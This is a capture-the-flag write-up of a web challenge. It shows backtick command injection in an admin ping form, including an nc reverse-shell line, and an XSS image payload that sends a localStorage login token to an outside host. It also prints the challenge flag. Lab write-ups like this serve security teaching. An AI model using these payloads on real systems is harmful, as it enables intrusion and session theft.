# Visiting the site

Visiting the site has an option to login or register.

![](screenshots/1.png)

![](screenshots/2.png)

# Login

Checking the traffic reveals the `/requestUsers` endpoint . It has cleartext credentials for all of the users.

![](screenshots/3.png)

![](screenshots/4.png)

# Admin

There is a simple form that can be used to ping hosts, only available to admins.

![](screenshots/5.png)

Giving out some errors on malformed input or error.

```json
{"error": "No valid IP address found"}
{"error": "Command execution failed: exit status 1"}
```

# Command injection

It is vulnerable to command injection with backticks for example. The input should contain a valid ip address.

Now there are 2 pings.

```
127.0.0.1 -c `echo 2`
```

![](screenshots/6.png)

There is `nc` on the server, opening a reverse shell is trivial.

```bash
`nc 10.8.0.59 8000 -e /bin/sh` 127.0.0.1 
```

![](screenshots/7.png)

# Flag
`hcsc25{H3y_BoRrow1ng_1s_n0t_Ste4l1ng}`

# XSS

This was probably the intended solution.

After registering and logging in as regular user, the complaints are vulnerable to XSS as well. The login token is stored inside local storage, and can be stolen.

```html
<img src=x onerror="fetch('http://10.8.0.59:8000?token='+localStorage.token)">
```

There were some bots on the discord server, named Xavier. As stated in the challenge description, sending any link (from the webapp) to the bot would be opened. After a few messages figuring out the syntax, the specific complaint with the XSS is visited.

![](screenshots/8.png)

And the token is stolen, which can be used to access the admin page.

![](screenshots/9.png)

# Binaries

The server files were taken from the challenge after code execution. They are in [app.tar.gz](src/app.tar.gz).